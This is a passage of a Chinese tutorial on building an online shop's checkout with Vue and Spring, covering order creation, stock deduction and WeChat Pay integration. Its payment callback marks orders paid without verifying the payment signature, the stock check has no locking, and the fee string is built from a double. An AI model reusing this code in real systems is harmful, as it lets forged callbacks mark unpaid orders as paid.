alt="1619752375851"></td></tr></tbody></table></li><li><p>渲染商品数量以及总价格</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619752439537.png" alt="1619752439537"></td></tr></tbody></table></li><li><p>在vue示例的data中声明opts和totalPrice，并且监听opts选项的改变—选项一旦改变就计算总价格</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619752613127.png" alt="1619752613127"></td></tr></tbody></table></li></ul><h6 id="20-3-2-点击“结算”跳转到订单添加页面"><a href="#20-3-2-点击“结算”跳转到订单添加页面" class="headerlink" title="20.3.2 点击“结算”跳转到订单添加页面"></a>20.3.2 点击“结算”跳转到订单添加页面</h6><blockquote><p>在购物车列表页面，选择购物车记录，点击“结算之后”将选择的购物车记录ID传递到order-add.html</p></blockquote><ul><li><p>shopcart.html</p><table><thead><tr><th><img src="imgs/1619753864337.png" alt="1619753864337"></th></tr></thead><tbody><tr><td><img src="imgs/1619753818141.png" alt="1619753818141"></td></tr></tbody></table></li><li><p>order-add.html</p><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/1619753916301.png" alt="1619753916301"></td></tr></tbody></table></li></ul><h6 id="20-3-3-显示收货地址及订单商品"><a href="#20-3-3-显示收货地址及订单商品" class="headerlink" title="20.3.3 显示收货地址及订单商品"></a>20.3.3 显示收货地址及订单商品</h6><h6 id="20-3-4-订单确认页面选择地址"><a href="#20-3-4-订单确认页面选择地址" class="headerlink" title="20.3.4 订单确认页面选择地址"></a>20.3.4 订单确认页面选择地址</h6><h2 id="二十一、订单提交及支付"><a href="#二十一、订单提交及支付" class="headerlink" title="二十一、订单提交及支付"></a>二十一、订单提交及支付</h2><h4 id="21-1-流程分析"><a href="#21-1-流程分析" class="headerlink" title="21.1 流程分析"></a>21.1 流程分析</h4><p><img src="imgs/1619766286877.png" alt="1619766286877"></p><h4 id="21-2-订单添加接口实现"><a href="#21-2-订单添加接口实现" class="headerlink" title="21.2 订单添加接口实现"></a>21.2 订单添加接口实现</h4><h6 id="21-2-1-数据库操作"><a href="#21-2-1-数据库操作" class="headerlink" title="21.2.1 数据库操作"></a>21.2.1 数据库操作</h6><ul><li><p>根据收货地址ID，获取收货地址信息（tkMapper）：收货人姓名、电话、地址也可以从前端传递过来</p></li><li><p>根据购物车ID，查询购物车详情（需要关联查询商品名称、sku名称、<code>库存</code>、商品图片、商品价格）</p><table><thead><tr><th>改造：<code>ShoppingCartMapper</code>中的<code>selectShopcartByCids</code></th></tr></thead><tbody><tr><td><img src="imgs/1619767517965.png" alt="1619767517965"></td></tr><tr><td><img src="imgs/1619767558431.png" alt="1619767558431"></td></tr><tr><td><img src="imgs/1619767584721.png" alt="1619767584721"></td></tr></tbody></table></li><li><p>保存订单（tkMapper）</p></li><li><p>修改库存（tkMapper）</p></li><li><p>保存商品快照（tkMapper）</p></li></ul><h6 id="21-2-2-业务层实现"><a href="#21-2-2-业务层实现" class="headerlink" title="21.2.2 业务层实现"></a>21.2.2 业务层实现</h6><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OrderServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">OrderService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">ShoppingCartMapper</span> shoppingCartMapper<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">OrdersMapper</span> ordersMapper<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">OrderItemMapper</span> orderItemMapper<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">ProductSkuMapper</span> productSkuMapper<span class="token punctuation">;</span>    <span class="token comment">/**     * 保存订单业务     */</span>    <span class="token annotation punctuation">@Transactional</span>    <span class="token keyword">public</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> <span class="token function">addOrder</span><span class="token punctuation">(</span><span class="token class-name">String</span> cids<span class="token punctuation">,</span><span class="token class-name">Orders</span> order<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//1.校验库存：根据cids查询当前订单中关联的购物车记录详情（包括库存）</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> cids<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> cidsList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span>arr<span class="token punctuation">.</span>length <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            cidsList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ShoppingCartVO</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> shoppingCartMapper<span class="token punctuation">.</span><span class="token function">selectShopcartByCids</span><span class="token punctuation">(</span>cidsList<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> f <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> untitled <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">ShoppingCartVO</span> sc<span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>sc<span class="token punctuation">.</span><span class="token function">getCartNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> sc<span class="token punctuation">.</span><span class="token function">getSkuStock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                f <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment">//获取所有商品名称，以,分割拼接成字符串</span>            untitled <span class="token operator">=</span> untitled<span class="token operator">+</span>sc<span class="token punctuation">.</span><span class="token function">getProductName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">","</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//2.保存订单</span>            order<span class="token punctuation">.</span><span class="token function">setUntitled</span><span class="token punctuation">(</span>untitled<span class="token punctuation">)</span><span class="token punctuation">;</span>            order<span class="token punctuation">.</span><span class="token function">setCreateTime</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            order<span class="token punctuation">.</span><span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//生成订单编号</span>            <span class="token class-name">String</span> orderId <span class="token operator">=</span> UUID<span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            order<span class="token punctuation">.</span><span class="token function">setOrderId</span><span class="token punctuation">(</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> i <span class="token operator">=</span> ordersMapper<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//3.生成商品快照</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">ShoppingCartVO</span> sc<span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> cnum <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>sc<span class="token punctuation">.</span><span class="token function">getCartNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> itemId <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">""</span><span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">89999</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">OrderItem</span> orderItem <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OrderItem</span><span class="token punctuation">(</span>itemId<span class="token punctuation">,</span> orderId<span class="token punctuation">,</span> sc<span class="token punctuation">.</span><span class="token function">getProductId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sc<span class="token punctuation">.</span><span class="token function">getProductName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sc<span class="token punctuation">.</span><span class="token function">getProductImg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sc<span class="token punctuation">.</span><span class="token function">getSkuId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sc<span class="token punctuation">.</span><span class="token function">getSkuName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span>sc<span class="token punctuation">.</span><span class="token function">getSellPrice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> cnum<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span>sc<span class="token punctuation">.</span><span class="token function">getSellPrice</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> cnum<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                orderItemMapper<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>orderItem<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment">//4.扣减库存：根据套餐ID修改套餐库存量</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">ShoppingCartVO</span> sc<span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token class-name">String</span> skuId <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">getSkuId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> newStock <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">getSkuStock</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>sc<span class="token punctuation">.</span><span class="token function">getCartNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">ProductSku</span> productSku <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProductSku</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                productSku<span class="token punctuation">.</span><span class="token function">setSkuId</span><span class="token punctuation">(</span>skuId<span class="token punctuation">)</span><span class="token punctuation">;</span>                productSku<span class="token punctuation">.</span><span class="token function">setStock</span><span class="token punctuation">(</span>newStock<span class="token punctuation">)</span><span class="token punctuation">;</span>                productSkuMapper<span class="token punctuation">.</span><span class="token function">updateByPrimaryKeySelective</span><span class="token punctuation">(</span>productSku<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment">//5.删除购物车：当购物车中的记录购买成功之后，购物车中对应做删除操作</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> cid<span class="token operator">:</span> cidsList<span class="token punctuation">)</span> <span class="token punctuation">{</span>                shoppingCartMapper<span class="token punctuation">.</span><span class="token function">deleteByPrimaryKey</span><span class="token punctuation">(</span>cid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"orderId"</span><span class="token punctuation">,</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"productNames"</span><span class="token punctuation">,</span>untitled<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> map<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token comment">//表示库存不足</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="21-2-3-订单添加接口实现"><a href="#21-2-3-订单添加接口实现" class="headerlink" title="21.2.3  订单添加接口实现"></a>21.2.3  订单添加接口实现</h6><ul><li>订单保存</li><li>申请支付链接</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/add"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">ResultVO</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">String</span> cids<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">Orders</span> order<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">ResultVO</span> resultVO <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> orderInfo <span class="token operator">=</span> orderService<span class="token punctuation">.</span><span class="token function">addOrder</span><span class="token punctuation">(</span>cids<span class="token punctuation">,</span> order<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> orderId <span class="token operator">=</span> orderInfo<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"orderId"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>orderId<span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//设置当前订单信息</span>            <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> data <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">,</span>orderInfo<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"productNames"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//商品描述</span>            data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"out_trade_no"</span><span class="token punctuation">,</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//使用当前用户订单的编号作为当前支付交易的交易号</span>            data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"fee_type"</span><span class="token punctuation">,</span><span class="token string">"CNY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">//支付币种</span>            data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"total_fee"</span><span class="token punctuation">,</span>order<span class="token punctuation">.</span><span class="token function">getActualAmount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//支付金额</span>            data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"trade_type"</span><span class="token punctuation">,</span><span class="token string">"NATIVE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//交易类型</span>            data<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"notify_url"</span><span class="token punctuation">,</span><span class="token string">"/pay/success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//设置支付完成时的回调方法接口</span>            <span class="token comment">//发送请求，获取响应</span>            <span class="token comment">//微信支付：申请支付连接</span>            <span class="token class-name">WXPay</span> wxPay <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WXPay</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MyPayConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> resp <span class="token operator">=</span> wxPay<span class="token punctuation">.</span><span class="token function">unifiedOrder</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>            orderInfo<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"payUrl"</span><span class="token punctuation">,</span>resp<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"code_url"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>OK<span class="token punctuation">,</span><span class="token string">"提交订单成功！"</span><span class="token punctuation">,</span>orderInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span><span class="token string">"提交订单失败！"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        resultVO <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResultVO</span><span class="token punctuation">(</span><span class="token class-name">ResStatus</span><span class="token punctuation">.</span>NO<span class="token punctuation">,</span><span class="token string">"提交订单失败！"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> resultVO<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="21-3-前端提交订单信息"><a href="#21-3-前端提交订单信息" class="headerlink" title="21.3 前端提交订单信息"></a>21.3 前端提交订单信息</h4><ul><li>点击“提交订单”按钮，触发<code>doSubmit</code></li></ul><table><thead><tr><th>order-add.html</th></tr></thead><tbody><tr><td><img src="imgs/1620350496129.png" alt="1620350496129"></td></tr></tbody></table><h4 id="21-4-支付回调"><a href="#21-4-支付回调" class="headerlink" title="21.4 支付回调"></a>21.4 支付回调</h4><blockquote><p>支付回调：当用户支付成功之后，支付平台会向我们指定的服务器接口发送请求传递订单支付状态数据</p></blockquote><h6 id="2-4-1-创建一个控制器定义回调接口"><a href="#2-4-1-创建一个控制器定义回调接口" class="headerlink" title="2.4.1 创建一个控制器定义回调接口"></a>2.4.1 创建一个控制器定义回调接口</h6><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/pay"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PayController</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> <span class="token class-name">OrderService</span> orderService<span class="token punctuation">;</span>    <span class="token comment">/**     * 回调接口:当用户支付成功之后，微信支付平台就会请求这个接口，将支付状态的数据传递过来     *     */</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/callback"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">paySuccess</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"--------------------callback"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 1.接收微信支付平台传递的数据（使用request的输入流接收）</span>        <span class="token class-name">ServletInputStream</span> is <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> builder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> is<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            builder<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>bs<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> builder<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//使用帮助类将xml接口的字符串装换成map</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token class-name">WXPayUtil</span><span class="token punctuation">.</span><span class="token function">xmlToMap</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token string">"success"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"result_code"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//支付成功</span>            <span class="token comment">//2.修改订单状态为“待发货/已支付”</span>            <span class="token class-name">String</span> orderId <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"out_trade_no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> i <span class="token operator">=</span> orderService<span class="token punctuation">.</span><span class="token function">updateOrderStatus</span><span class="token punctuation">(</span>orderId<span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"--orderId:"</span><span class="token operator">+</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//3.响应微信支付平台</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> resp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"return_code"</span><span class="token punctuation">,</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                resp<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"return_msg"</span><span class="token punctuation">,</span><span class="token string">"OK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                